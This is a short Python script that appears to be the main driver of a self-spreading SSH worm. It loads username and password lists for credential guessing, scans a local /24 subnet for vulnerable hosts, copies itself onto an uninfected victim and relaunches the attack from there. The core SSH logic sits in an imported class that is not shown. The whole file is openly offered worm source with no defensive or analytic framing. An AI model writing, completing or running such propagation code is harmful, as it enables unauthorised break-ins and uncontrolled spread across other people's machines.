from SSHConnection import SSHConnection
import sys


def main():

    username_file = "usernames.txt"
    password_file = "passwords.txt"

    """ Create Instance of the SSH class """
    worm = SSHConnection()
    worm.set_password_file(password_file)
    worm.set_username_file(username_file)

    """ Set the file to place on victim system """
    worm.set_worm_file(sys.argv[0])

    """ Set default vulnerable hosts to scan """
    worm.retrieve_vulnerable_hosts("192.168.1.0/24")

    """ Find a target to infect, checks to make sure target hasn't previously
        been infected """
    worm.find_target_host()

    """ Mark host system"""
    worm.place_worm()

    """ Start attack from new system """
    worm.start_attack()


if __name__ == "__main__":
    main()